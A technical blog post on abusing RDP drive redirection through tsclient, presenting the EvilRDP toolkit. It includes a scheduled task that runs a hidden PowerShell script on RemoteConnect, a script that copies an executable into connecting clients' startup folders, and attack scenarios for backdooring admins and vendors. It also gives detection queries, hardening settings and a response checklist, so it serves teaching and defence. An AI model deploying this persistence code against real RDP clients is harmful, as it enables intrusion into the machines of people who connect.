---
title: "Weaponizing RDP Files: A Deep Dive into EvilRDP and Drive Redirection Attacks"
author: "Aibel"
date: 2025-10-01
draft: false
tags: ["RDP", "red-team", "windows", "persistence", "penetration-testing", "evasion"]
description: "A technical deep-dive into how RDP's drive redirection feature can be weaponized via the tsclient attack vector — including a walkthrough of the EvilRDP toolkit, real-world attack scenarios, and defensive countermeasures."
---

## Abstract

Remote Desktop Protocol (RDP) is a fundamental component of modern Windows infrastructure, enabling remote administration and remote work capabilities. However, the same features that make RDP convenient for legitimate users can be weaponized by attackers. This technical article explores the mechanics of RDP drive redirection attacks, presents EvilRDP — a proof-of-concept toolkit for security testing — and provides defensive recommendations.

## Introduction

Remote Desktop Protocol has become ubiquitous in enterprise environments, with organizations relying on it for system administration, remote support, and work-from-home connectivity. According to recent threat intelligence reports, attackers have increasingly leveraged legitimate RDP features to conduct fileless attacks, exfiltrate data, and establish persistence mechanisms without writing malicious files to disk.

The technique explored in this article focuses on abusing RDP's drive redirection feature, which allows clients to access their local drives through a remote session. While this functionality serves legitimate purposes, it creates a bidirectional attack surface where compromised RDP servers can target connecting clients.

## Understanding RDP Drive Redirection

### Technical Background

RDP drive redirection is implemented through the Remote Desktop Services Device Redirection (RDPDR) virtual channel. When a user connects to an RDP server with drive redirection enabled, their local drives become accessible on the server through a virtual network location named `tsclient`.

The mapping follows this structure:

```
\\tsclient\<drive_letter>\
```

For example:
- `\\tsclient\c\` — Client's C: drive
- `\\tsclient\d\` — Client's D: drive
- `\\tsclient\<share_name>\` — Network shares mounted on the client

### RDP Configuration Parameters

Drive redirection is controlled by specific parameters in RDP configuration files (.rdp):

```ini
drivestoredirect:s:*
```

This parameter can be configured with the following values:
- `*` — Redirect all drives
- Specific drive letters (e.g., `C:;D:`)
- Empty value — No drive redirection

Additional related parameters include:

```ini
redirectclipboard:i:1        # Clipboard redirection
redirectprinters:i:1         # Printer redirection
redirectcomports:i:1         # COM port redirection
redirectsmartcards:i:1       # Smart card redirection
devicestoredirect:s:*        # Device redirection
```

### The Security Implications

When drive redirection is enabled, the RDP server gains read and write access to the client's file system. This creates several security concerns:

1. **Data Exfiltration**: Servers can read sensitive files from client machines
2. **Malware Distribution**: Servers can write malicious files to client systems
3. **Persistence Mechanisms**: Servers can plant backdoors in client startup locations
4. **Credential Theft**: Servers can access credential stores and configuration files

## The tsclient Attack Vector

### Historical Context

The tsclient attack vector was first documented in enterprise attacks around 2019–2020. Security researchers at Bitdefender identified threat actors using this technique to distribute ransomware, cryptocurrency miners, and information stealers. The technique gained prominence due to its fileless nature — malware could execute from the tsclient network share without being written to the server's disk.

### Attack Flow

```
1. Attacker compromises RDP server
2. Attacker configures malicious scheduled task or startup script
3. Administrator connects via RDP with drive redirection enabled
4. Attacker's code executes on server
5. Attacker accesses \\tsclient\c\ path
6. Attacker writes malicious files to client's startup folder
7. Client system reboots or administrator logs in again
8. Malicious payload executes on client with user privileges
9. Attacker pivots to client machine
```

### Why This Attack is Effective

1. **Legitimate Functionality**: Drive redirection is a standard Windows feature
2. **No CVE Required**: No vulnerability exploitation is necessary
3. **Minimal Forensic Evidence**: Server-side disk forensics may miss the attack
4. **Trust Relationship**: Users often trust RDP servers they connect to
5. **Privilege Context**: Code executes with the connecting user's privileges
6. **EDR Blind Spots**: Traditional endpoint detection may not monitor tsclient paths

## Attack Methodology

### Phase 1: Initial Server Compromise

Before leveraging the tsclient attack vector, an attacker must first compromise the RDP server. Common methods include:

- Credential stuffing or brute force attacks
- Exploiting vulnerabilities in exposed RDP services
- Compromising accounts through phishing
- Leveraging stolen credentials from previous breaches
- Man-in-the-middle attacks on RDP sessions

### Phase 2: Monitoring for RDP Connections

Once server access is established, attackers monitor for incoming RDP sessions.

**Method 1: Scheduled Task with Session Change Trigger**

```xml
<SessionStateChangeTrigger>
  <Enabled>true</Enabled>
  <StateChange>RemoteConnect</StateChange>
</SessionStateChangeTrigger>
```

**Method 2: Polling with Query User**

```cmd
query user
```

**Method 3: WMI Event Subscription**

```powershell
Register-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'" -Action { <malicious_code> }
```

### Phase 3: Enumerating Client Drives

```powershell
Get-ChildItem \\tsclient\ -Directory
```

### Phase 4: Target Selection and Payload Deployment

**Startup Folders (Per User):**
```
\\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

**Startup Folders (All Users):**
```
\\tsclient\c\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

### Phase 5: Payload Execution

The payload executes when:
- User logs in again (startup folder method)
- System reboots
- Scheduled task triggers
- User manually executes the file

## EvilRDP Architecture

### Overview

EvilRDP is a Python-based toolkit designed to automate the process of creating weaponized RDP configurations for authorized security testing. The tool provides a structured approach to demonstrating this attack vector in controlled environments.

### Component Architecture

```
EvilRDP/
├── EvilRDP.py                 # Main automation script
├── requirements.txt           # Python dependencies
├── README.md                  # Documentation
└── examples/
    ├── sample.rdp            # Sample RDP configuration
    ├── sample.ps1            # Sample PowerShell payload
    └── EvilRDP_Task.xml      # Sample scheduled task
```

## Technical Implementation

### RDP File Modification

```python
def modify_rdp_file(rdp_path, new_ip):
    with open(rdp_path, 'r', encoding='utf-16-le') as f:
        content = f.read()
    
    content = content.replace(
        'full address:s:OLD_IP',
        f'full address:s:{new_ip}'
    )
    
    if 'drivestoredirect:s:' not in content:
        content += '\ndrivestoredirect:s:*\n'
```

Key RDP parameters for the attack:

```ini
full address:s:192.168.1.100
drivestoredirect:s:*
redirectclipboard:i:1
redirectprinters:i:1
redirectcomports:i:1
redirectsmartcards:i:1
devicestoredirect:s:*
session bpp:i:32
compression:i:1
keyboardhook:i:2
```

### PowerShell Payload Generation

```powershell
$Users = Get-ChildItem -Path "\\tsclient\C\Users" -Directory | 
    Where-Object { $_.Name -notlike "Public" -and $_.Name -notlike "Default*" }

foreach ($User in $Users) {
    $StartupPath = "\\tsclient\C\Users\$($User.Name)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    
    Copy-Item -Path "C:\Payload\malicious.exe" `
              -Destination $StartupPath `
              -ErrorAction SilentlyContinue
}
```

### Scheduled Task Configuration

```xml
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <SessionStateChangeTrigger>
      <Enabled>true</Enabled>
      <UserId>DOMAIN\User</UserId>
      <StateChange>RemoteConnect</StateChange>
    </SessionStateChangeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>DOMAIN\User</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Actions>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Scripts\payload.ps1"</Arguments>
    </Exec>
  </Actions>
</Task>
```

## Attack Scenarios

### Scenario 1: Administrator Workstation Compromise

1. Deploy scheduled task on file server triggering on `RemoteConnect`
2. Task executes PowerShell script accessing `\\tsclient\c\`
3. Script identifies administrator's startup folder
4. Beacon or backdoor copied to startup folder
5. Administrator disconnects and returns to workstation
6. Workstation reboots — beacon executes with admin privileges
7. Attacker gains persistent access and pivots further

### Scenario 2: Data Exfiltration

On connection, script enumerates common document locations:
- `\\tsclient\c\Users\<user>\Documents`
- `\\tsclient\c\Users\<user>\Desktop`
- `\\tsclient\c\Users\<user>\Downloads`

Files matching `*.docx`, `*.xlsx`, `*.pdf` are staged server-side for exfiltration.

### Scenario 3: Supply Chain Attack via Jump Box

1. Attacker compromises internet-facing jump box
2. Vendor connects to jump box from their corporate network
3. Attacker's script accesses vendor's local drives via tsclient
4. Backdoor deployed to vendor's startup folder
5. Vendor disconnects — backdoor runs on vendor's corporate network
6. Attacker pivots from the organization into the vendor

### Scenario 4: Persistence via IT Help Desk

With help desk servers compromised, every remote support session becomes a lateral movement opportunity — the attacker can simultaneously backdoor both the end-user workstation and the help desk technician's own machine via reverse tsclient access.

## Detection and Prevention

### Detection Strategies

**1. Monitor tsclient Access Patterns**

```
Event ID 4663 (File System Audit)
Object Name contains: \\Device\Mup\tsclient\
```

**2. Scheduled Task Monitoring**

```
Event ID 4698 (Scheduled Task Created)
Trigger Type: SessionStateChange
State Change: RemoteConnect
```

**3. Microsoft Sentinel KQL**

```kql
SecurityEvent
| where EventID == 4663
| where ObjectName contains @"\Device\Mup\tsclient\"
| where AccessMask == "0x2"
| project TimeGenerated, Account, ObjectName, ProcessName, Computer
```

**4. Splunk**

```spl
index=windows EventCode=4663 
| where like(object_name, "%\\Device\\Mup\\tsclient%") 
| where access_mask="0x2" 
| stats count by user, object_name, process_name
```

### Prevention Strategies

**Disable Drive Redirection (Most Effective)**

Group Policy:
```
Computer Configuration → Administrative Templates → Windows Components
  → Remote Desktop Services → Remote Desktop Session Host
    → Device and Resource Redirection → Do not allow drive redirection: Enabled
```

Registry:
```
HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services
fDisableCdm = 1 (DWORD)
```

**Secure RDP File Template**

```ini
full address:s:rdp-server.example.com
drivestoredirect:s:
redirectclipboard:i:0
redirectprinters:i:0
redirectcomports:i:0
redirectsmartcards:i:0
redirectposdevices:i:0
devicestoredirect:s:
enablecredsspsupport:i:1
authentication level:i:2
negotiate security layer:i:1
```

**Application Whitelisting**

```xml
<FilePathRule Id="deny-tsclient" Name="Block tsclient execution" Action="Deny">
    <Conditions>
        <FilePathCondition Path="\\Device\Mup\tsclient\*" />
    </Conditions>
</FilePathRule>
```

### Incident Response Checklist

- [ ] Isolate affected RDP server from network
- [ ] Terminate active RDP sessions
- [ ] Collect volatile memory from server
- [ ] Review RDP connection logs (Event ID 4624, Type 10)
- [ ] Examine scheduled tasks for `SessionStateChange` triggers
- [ ] Check startup folders on all systems that connected via RDP
- [ ] Reset credentials for all users in the compromise window
- [ ] Enable file system auditing on RDP servers
- [ ] Deploy EDR rules for tsclient monitoring
- [ ] Conduct security awareness training

## Conclusion

The weaponization of RDP drive redirection represents a sophisticated attack vector that leverages legitimate Windows functionality for malicious purposes. No CVE, no novel exploit — just a trusted feature turned against the user. Organizations must balance the usability of drive redirection against the security risk it introduces, implementing appropriate controls and monitoring for the features they choose to keep enabled.

The EvilRDP toolkit is available as open-source software for authorized security testing at: [https://github.com/AibelKingslayer/EvilRDP](https://github.com/AibelKingslayer/EvilRDP)

## References

1. Bitdefender Labs. "RDP Abuse: An Analysis of Fileless Attacks." Bitdefender, 2019.
2. Black Hills Information Security. "Rogue RDP: Revisiting Initial Access Methods." BHIS Blog, 2022.
3. CyberArk Labs. "Attacking RDP from Inside: Named Pipe Hijacking." CyberArk, 2022.
4. MDSec Research. "RDPInception: Recursive RDP Attacks." MDSec Blog, 2017.
5. Google Threat Intelligence Group. "Windows Remote Desktop Protocol: Remote to Rogue." Google Cloud Blog, 2024.
6. MITRE ATT&CK. "T1021.001: Remote Desktop Protocol." MITRE Corporation.
